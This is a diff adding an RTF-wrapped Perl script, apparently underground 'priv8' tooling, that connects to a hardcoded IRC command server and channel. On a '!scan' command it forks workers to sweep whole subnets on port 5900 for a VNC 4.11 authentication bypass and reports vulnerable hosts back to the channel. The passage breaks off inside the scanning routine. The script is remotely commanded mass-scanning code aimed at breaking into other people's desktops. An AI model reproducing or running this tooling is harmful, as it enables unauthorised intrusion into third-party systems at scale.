@@ -1,0 +1,269 @@
+{\rtf1\ansi\ansicpg1252\cocoartf1138\cocoasubrtf510
+{\fonttbl\f0\fmodern\fcharset0 Courier;}
+{\colortbl;\red255\green255\blue255;\red252\green108\blue0;\red17\green103\blue0;\red0\green0\blue182;
+\red209\green0\blue0;}
+\paperw11900\paperh16840\margl1440\margr1440\vieww10800\viewh8400\viewkind0
+\deftab720
+\pard\pardeftab720
+
+\f0\fs24 \cf2 #!/usr/bin/perl \
+\'a0\'a0\'a0\'a0#\'a0IRC\'a0Scanner\'a0-\'a0VNC\'a0VULN\'a0SCAN \
+\'a0\'a0\'a0\'a0#\'a0by\'a0Nexen\'a0&&\'a0CrashOveriDe \
+\'a0\'a0\'a0\'a0#\'a0Multi-threaded\'a0scan\'a0for\'a0OpenVNC\'a04.11\'a0authentication\'a0bypass. \
+\'a0\'a0\'a0\'a0#\'a0Based\'a0on\'a0Tyler\'a0Krpata's\'a0Perl\'a0scanning\'a0code. \
+\'a0 \
+\'a0\'a0\'a0\'a0#piglio\'a0le\'a0librerie \
+\'a0\'a0\'a0\'a0\cf3 use\'a0\cf4 IO\cf3 ::\cf4 Socket\cf3 ; \
+\'a0\'a0\'a0\'a0use\'a0\cf4 IO\cf3 ::\cf4 Socket\cf3 ::\cf4 INET\cf3 ; \
+\'a0\'a0\'a0\'a0use\'a0\cf4 threads\cf3 ; \
+\'a0\'a0\'a0\'a0use\'a0\cf4 threads\cf3 ::\cf4 shared\cf3 ; \
+\'a0\'a0\'a0\'a0use\'a0\cf4 Errno\'a0qw\cf3 (\cf4 EAGAIN\cf3 ); \
+\'a0\'a0\'a0\'a0use\'a0\cf4 strict\cf3 ; \
+\'a0\'a0\'a0\'a0use\'a0\cf4 warnings\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$line\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$vulnerabili\cf3 ; \
+\'a0 \
+\'a0 \
+\'a0\'a0\'a0\'a0\cf2 #definisco\'a0alcune\'a0var \
+\'a0\'a0\'a0\'a0\cf4 our\'a0\cf3 @\cf4 results\'a0\cf3 :\'a0\cf4 shared\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 our\'a0$todo\'a0\cf3 =\'a0\cf4 0\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 our\'a0$contatore\'a0\cf3 =\'a0\cf4 0\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$orig_thread\'a0\cf3 =\'a0\cf5 "yes"\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$start\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$end\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$time_estimate\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$elapsed\'a0\cf3 =\'a0\cf4 time\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$out_file\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0++$|;\'a0\cf2 #\'a0To\'a0watch\'a0as\'a0the\'a0results\'a0come\'a0in,\'a0in\'a0real\'a0time. \
+\'a0 \
+\'a0\'a0\'a0\'a0#variabili\'a0di\'a0configurazione \
+\'a0\'a0\'a0\'a0\cf3 use\'a0\cf4 constant\'a0VNC_PORT\'a0\cf3 =>\'a0\cf4 5900\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$splits\'a0\cf3 =\'a0\cf4 5\cf3 ;\'a0\cf2 #\'a0Creates\'a02^N\'a0processes. \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$avg_time\'a0\cf3 =\'a0\cf4 5\cf3 ;\'a0\cf2 #\'a0Tweak\'a0this\'a0to\'a0get\'a0better\'a0time\'a0estimates. \
+\'a0\'a0\'a0\'a0\cf4 our\'a0$subnet\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$server\cf3 =\cf5 "93.174.0.37"\cf3 ;\'a0\cf2 #\'a0irc\'a0server \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$porta\cf3 =\cf5 "7000"\cf3 ;\'a0\cf2 #\'a0port \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$nick\cf3 =\cf5 "[Scan|VNC]"\cf3 ;\cf2 #\'a0nick \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$canale\cf3 =\cf5 "#xp"\cf3 ;\'a0\cf2 #\'a0canale \
+\'a0 \
+\'a0\'a0\'a0\'a0#mi\'a0connetto\'a0a\'a0irc \
+\'a0\'a0\'a0\'a0\cf4 my\'a0$sk\'a0\cf3 =\'a0\cf4 IO\cf3 ::\cf4 Socket\cf3 ::\cf4 INET\cf3 ->\cf4 new\cf3 (\cf4 PeerAddr\cf3 =>\cf5 "\cf4 $server\cf5 "\cf3 ,\cf4 PeerPort\cf3 =>\cf5 "\cf4 $porta\cf5 "\cf3 ,\cf4 Proto\cf3 =>\cf5 "tcp"\cf3 )\'a0or\'a0die\'a0\cf5 "Can\'a0not\'a0connect\'a0on\'a0server!\\n"\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 $sk\cf3 ->\cf4 autoflush\cf3 (\cf4 1\cf3 ); \
+\'a0\'a0\'a0\'a0print\'a0\cf4 $sk\'a0\cf5 "PASS\'a0mawhaha\\r\\n"\cf3 ; \
+\'a0\'a0\'a0\'a0print\'a0\cf4 $sk\'a0\cf5 "NICK\'a0\cf4 $nick\cf5 \\r\\n"\cf3 ; \
+\'a0\'a0\'a0\'a0print\'a0\cf4 $sk\'a0\cf5 "USER\'a0vncscan_bot\'a08\'a0*\'a0\'a0:\'a0nexen\'a0:\'a0priv8\'a0:\'a0crash_overide\'a0:unknown\\r\\n"\cf3 ; \
+\'a0\'a0\'a0\'a0print\'a0\cf4 $sk\'a0\cf5 "JOIN\'a0\cf4 $canale\cf5 \\r\\n"\cf3 ; \
+\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "\'a04,1\'a09Priv8\'a0VNC\'a0SCANNER\'a0---\'a0by\'a0\'a04CrashOveriDe\'a0&\'a0Nexen\'a09\'a0--\'a0Priv8!!\'a0Priv8!!\'a0Priv8!!\'a0--\'a0!!\'a0\'a0\\r\\n"\cf3 ); \
+\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "\'a04,1\'a09Priv8\'a0VNC\'a0SCANNER\'a0---\'a0For\'a0scan\'a0use\'a0\'a04!scan\'a0range\'a09\'a0[ex\'a01.1.1.*]--\'a0Priv8!!\'a0Priv8!!\'a0Priv8!!\'a0--\'a0!!\'a0\'a0\\r\\n"\cf3 ); \
+\'a0\'a0\'a0\'a0\cf2 #PRENDO\'a0I\'a0MESSAGGI \
+\'a0\'a0\'a0\'a0\cf3 while(\cf4 $line\'a0\cf3 =\'a0<\cf4 $sk\cf3 >)\{ \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $line\'a0\cf3 =~\'a0\cf4 s\cf3 /\\\cf4 r\cf3 \\\cf4 n\cf3 $\cf2 //; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\cf3 if\'a0(\cf4 $line\cf3 =~\'a0/^\cf4 PING\'a0\cf3 \\:(.*)/)\'a0\cf2 ########\'a0PING\'a0REPLY \
+\'a0\'a0\'a0\'a0\'a0\'a0\cf3 \{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0print\'a0\cf4 $sk\'a0\cf5 "PONG\'a0:$1"\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\}\'a0\cf2 ############################\'a0END\'a0PING\'a0REPLY \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\cf3 if\'a0(\cf4 $line\cf3 =~\'a0/!\cf4 scan\'a0\cf3 (.+)/) \
+\'a0\'a0\'a0\'a0\'a0\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $subnet\'a0\cf3 =\'a0$\cf4 1\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0if\'a0(\cf4 $subnet\'a0\cf3 =~\'a0\cf4 m\cf3 /^\\\cf4 d\cf3 \{\cf4 1\cf3 ,\cf4 3\cf3 \}\\.\\\cf4 d\cf3 \{\cf4 1\cf3 ,\cf4 3\cf3 \}\\.\\\cf4 d\cf3 \{\cf4 1\cf3 ,\cf4 3\cf3 \}\\.?\\*?/)\'a0\{ \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Put\'a0the\'a0subnet\'a0in\'a0the\'a0form\'a0x.y.z.\'a0so\'a0we\'a0can\'a0just\'a0concatenate\'a0the\'a0hostnum. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $subnet\'a0\cf3 =~\'a0\cf4 s\cf3 /^(\\\cf4 d\cf3 \{\cf4 1\cf3 ,\cf4 3\cf3 \}\\.\\\cf4 d\cf3 \{\cf4 1\cf3 ,\cf4 3\cf3 \}\\.\\\cf4 d\cf3 \{\cf4 1\cf3 ,\cf4 3\cf3 \}).*/$\cf4 1\cf3 /; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $subnet\'a0\cf3 .=\'a0\cf5 "."\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $out_file\'a0\cf3 =\'a0\cf5 "VNC_"\'a0\cf3 .\'a0\cf4 $subnet\'a0\cf3 .\'a0\cf5 "txt"\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Mostly\'a0a\'a0guesstimate \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $time_estimate\'a0\cf3 =\'a0\cf4 $avg_time\'a0\cf3 *\'a0(\cf4 256\'a0\cf3 /\'a0(\cf4 2\cf3 **\cf4 $splits\cf3 )); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $time_estimate\'a0\cf3 =\'a0\cf4 int\'a0\cf3 (\cf4 $time_estimate\'a0\cf3 /\'a0\cf4 60\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $time_estimate\'a0\cf3 +=\'a0\cf4 4\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "\'a04,1\'a09Scanning\'a0subnet\'a0\cf3 $\{\cf4 subnet\cf3 \}\cf5 x\'a0--\'a0this\'a0should\'a0take\'a0approximately\'a0\cf4 $time_estimate\cf5 \'a0minute(s).\'a0\'a0\\n"\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "\'a04,1\'a09[!]\'a0=\'a0Vulnerable,[*]\'a0=\'a0Safe,\'a0[.]\'a0=\'a0No\'a0response.\'a0\'a0"\cf3 ); \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 CHECK\cf3 :\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 unless\'a0\cf3 (\cf4 $splits\'a0\cf3 >=\'a0\cf4 0\'a0\cf3 &&\'a0\cf4 $splits\'a0\cf3 <=\'a0\cf4 8\cf3 )\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0die\'a0\cf5 "ERROR:\'a0Do\'a0not\'a0split\'a0\cf4 $splits\cf5 \'a0times--that\'a0makes\'a0no\'a0sense.\\n"\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 unless\'a0\cf3 (\cf4 $splits\'a0\cf3 <=\'a0\cf4 5\cf3 )\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 warn\'a0\cf5 "Reduce\'a0the\'a0number\'a0of\'a0splits\'a0from\'a0\cf4 $splits\cf5 \'a0to\'a05\'a0or\'a0less\'a0if\'a0you \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0get\'a0memory\'a0errors.\\n\\n"\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0 \
+\'a0 \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Ugly,\'a0but\'a0this\'a0works. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 DivideWork\cf3 ()\'a0if\'a0\cf4 $splits\'a0\cf3 >=\'a0\cf4 1\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 DivideWork\cf3 ()\'a0if\'a0\cf4 $splits\'a0\cf3 >=\'a0\cf4 2\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 DivideWork\cf3 ()\'a0if\'a0\cf4 $splits\'a0\cf3 >=\'a0\cf4 3\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 DivideWork\cf3 ()\'a0if\'a0\cf4 $splits\'a0\cf3 >=\'a0\cf4 4\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 DivideWork\cf3 ()\'a0if\'a0\cf4 $splits\'a0\cf3 >=\'a0\cf4 5\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 DivideWork\cf3 ()\'a0if\'a0\cf4 $splits\'a0\cf3 >=\'a0\cf4 6\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 DivideWork\cf3 ()\'a0if\'a0\cf4 $splits\'a0\cf3 >=\'a0\cf4 7\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 DivideWork\cf3 ()\'a0if\'a0\cf4 $splits\'a0\cf3 >=\'a0\cf4 8\cf3 ; \
+\'a0 \
+\'a0 \
+\'a0 \
+\'a0 \
+\'a0\'a0\'a0\'a0\cf2 #\'a0Which\'a0IPs\'a0this\'a0thread\'a0scans. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $start\'a0\cf3 =\'a0\cf4 $todo\'a0\cf3 <<\'a0(\cf4 8\'a0\cf3 -\'a0\cf4 $splits\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $end\'a0\cf3 =\'a0\cf4 $start\'a0\cf3 +\'a0(\cf4 256\'a0\cf3 /\'a0(\cf4 2\cf3 **\cf4 $splits\cf3 ))\'a0-\'a0\cf4 1\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0foreach\'a0(\cf4 $start\'a0\cf3 ..\'a0\cf4 $end\cf3 )\'a0\{ \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 Scan_VNC\cf3 (\cf4 $_\cf3 ); \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 wait\'a0until\'a0\cf3 $?;\'a0\cf2 #\'a0Wait\'a0for\'a0children\'a0to\'a0finish. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf3 exit\'a0\cf4 unless\'a0$orig_thread\'a0eq\'a0\cf5 "yes"\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Only\'a0the\'a0original\'a0parent\'a0thread\'a0will\'a0continue. \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $elapsed\'a0\cf3 =\'a0\cf4 time\'a0\cf3 -\'a0\cf4 $elapsed\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $elapsed\'a0\cf3 /=\'a0\cf4 60\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $elapsed\'a0\cf3 =\'a0\cf4 int\'a0$elapsed\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "\'a04,1\'a09Finished\'a0scanning\'a0\cf3 $\{\cf4 subnet\cf3 \}\cf5 x\'a0in\'a0\cf4 $elapsed\cf5 \'a0minute(s).\'a0\'a0"\cf3 ); \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $vulnerabili\cf3 =\cf4 SaveData\cf3 (); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "\'a04,1\'a09Trovate\'a0TOTALI\'a0\cf4 $vulnerabili\cf5 \'a0VNCS\'a0\'a0"\cf3 ); \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\}\'a0else\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "\'a04,1\'a09Non\'a0e\'a0la\'a0sintassi\'a0giusta\'a0lamah.\'a0Inserisci\'a0qualcosa\'a0come\'a0192.168.1.*\'a0"\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0 \
+\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0\'a0\'a0\'a0\cf2 #################################### \
+\'a0 \
+\'a0\'a0\'a0\'a0\cf4 sub\'a0DivideWork\'a0\cf3 \{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 my\'a0$pid\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 FORK\cf3 :\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $todo\'a0\cf3 *=\'a0\cf4 2\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0if\'a0(\cf4 $pid\'a0\cf3 =\'a0\cf4 fork\cf3 )\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Parent \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf3 ++\cf4 $todo\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\}\'a0\cf4 elsif\'a0\cf3 (\cf4 defined\'a0$pid\cf3 )\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Child \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $orig_thread\'a0\cf3 =\'a0\cf5 "no"\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\}\'a0\cf4 elsif\'a0\cf3 ($!\'a0==\'a0\cf4 EAGAIN\cf3 )\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Recoverable\'a0forking\'a0error. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 sleep\'a07\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 redo\'a0FORK\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\}\'a0else\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Unable\'a0to\'a0fork. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "Unable\'a0to\'a0fork:\'a0$!\\n"\cf3 ); \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0 \
+\'a0\'a0\'a0\'a0\cf4 sub\'a0SaveData\'a0\cf3 \{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 my\'a0$vulns\'a0\cf3 =\'a0\cf4 0\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 open\cf3 (\cf4 FOUND\cf3 ,\'a0\cf5 ">"\cf3 ,\'a0\cf4 $out_file\cf3 )\'a0or\'a0die\'a0\cf5 "Cannot\'a0open\'a0\cf4 $out_file\cf5 \'a0--\'a0$!"\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0foreach\'a0\cf4 my\'a0$IP\'a0\cf3 (\cf4 1..254\cf3 )\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 my\'a0$record\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $record\'a0\cf3 =\'a0\cf4 $results\cf3 [\cf4 $IP\cf3 ]; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 unless\'a0\cf3 (\cf4 $record\'a0\cf3 =~\'a0/\cf4 not\'a0vulnerable\cf3 /)\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0++\cf4 $vulns\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0print\'a0\cf4 FOUND\'a0$record\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0print\'a0\cf4 FOUND\'a0\cf5 "\\nVulnerabilites\'a0found:\'a0\cf4 $vulns\cf5 "\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 close\cf3 (\cf4 FOUND\cf3 )\'a0or\'a0die\'a0\cf5 "Cannot\'a0close\'a0\cf4 $out_file\cf5 \'a0--\'a0$!"\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "Data\'a0saved\'a0to\'a0\cf3 $\{\cf4 out_file\cf3 \}\cf5 "\cf3 ); \
+\'a0\'a0\'a0\'a0return\'a0\cf4 $vulns\cf3 ; \
+\'a0\'a0\'a0\'a0\} \
+\'a0 \
+\'a0\'a0\'a0\'a0\cf4 sub\'a0Scan_VNC\'a0\cf3 \{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Scan\'a0for\'a0OpenVNC\'a04.11\'a0authentication\'a0bypass. \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 my\'a0$hostnum\'a0\cf3 =\'a0\cf4 shift\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 my\'a0$host\'a0\cf3 =\'a0\cf4 $subnet\'a0\cf3 .\'a0\cf4 $hostnum\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 my\'a0$sock\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 my\'a0$proto_ver\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 my\'a0$ignored\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 my\'a0$auth_type\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 my\'a0$sec_types\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 my\'a0$vnc_data\cf3 ; \
+\'a0 \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $host\'a0\cf3 or\'a0\cf4 printa\cf3 (\cf5 "ERROR:\'a0no\'a0host\'a0passed\'a0to\'a0Scan_VNC."\cf3 ); \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0The\'a0host\'a0numbers\'a0.0\'a0and\'a0.255\'a0are\'a0reserved;\'a0ignore\'a0them. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf3 if\'a0(\cf4 $hostnum\'a0\cf3 <=\'a0\cf4 0\'a0\cf3 or\'a0\cf4 $hostnum\'a0\cf3 >=\'a0\cf4 255\cf3 )\'a0\{\'a0return;\'a0\} \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\cf2 #\'a0Format\'a0things\'a0nicely--that\'a0crazy\'a0formula\'a0just\'a0adds\'a0spaces. \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $results\cf3 [\cf4 $hostnum\cf3 ]\'a0=\'a0\cf5 "\cf4 $host\cf5 "\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $results\cf3 [\cf4 $hostnum\cf3 ]\'a0.=\'a0(\cf5 "\'a0"\'a0\cf4 x\'a0\cf3 (\cf4 4\'a0\cf3 -\'a0\cf4 int\cf3 (\cf4 log\cf3 (\cf4 $hostnum\cf3 )/\cf4 log\cf3 (\cf4 10\cf3 ))))\'a0.\'a0\cf5 "\'a0=\'a0"\cf3 ; \
+\'a0 \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 unless\'a0\cf3 (\cf4 $sock\'a0\cf3 =\'a0\cf4 IO\cf3 ::\cf4 Socket\cf3 ::\cf4 INET\cf3 ->\cf4 new\cf3 (\cf4 PeerAddr\'a0\cf3 =>\'a0\cf4 $host\cf3 ,\'a0\cf4 PeerPort\'a0\cf3 =>\'a0\cf4 VNC_PORT\cf3 ,\'a0\cf4 Proto\'a0\cf3 =>\'a0\cf5 'tcp'\cf3 ,))\'a0\{ \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 $results\cf3 [\cf4 $hostnum\cf3 ]\'a0.=\'a0\cf5 "Not\'a0vulnerable,\'a0no\'a0response.\\n"\cf3 ; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\cf4 printa\cf3 (\cf5 "."\cf3 ); \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0return; \
+\'a0\'a0\'a0\'a0\'a0\'a0\'a0\'a0\} \
+\'a0 \
